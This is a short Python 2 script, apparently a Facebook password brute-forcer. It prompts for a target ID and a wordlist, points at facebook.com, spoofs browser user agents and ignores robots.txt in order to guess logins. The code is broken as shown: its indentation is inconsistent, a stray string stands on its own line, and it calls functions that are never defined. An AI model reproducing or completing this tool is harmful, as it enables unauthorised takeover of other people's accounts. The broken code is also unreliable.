#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import os
import sys
import mechanize
import cookielib
import random

os.system('clear')

W = '\033[1;34;40m'
Br = '\033[1;32;40m'
Bg = '\033[1;31;40m'
Y = '\033[1;32;40m'
Bb = '\033[1;32;40m'
Bm = '\033[1;32;40m'
Bc = '\033[1;32;40m'
M = '\033[1;34m'
C = '\033[1;31m'
D = '\033[1;32m'

print(M)
'========================================='

print(C)

#email
email = str(raw_input("ID : "))

#wordlist
passwordlist = str(raw_input("Wordlist : "))

#Target Website
login = "https://www.facebook.com"

#useragents
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

print(D)

def main():
 global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=0)
        welcome()
        search()
        print('\r')
        print(M)
        print("Password does not exist in the wordlist")
        print(Bg)
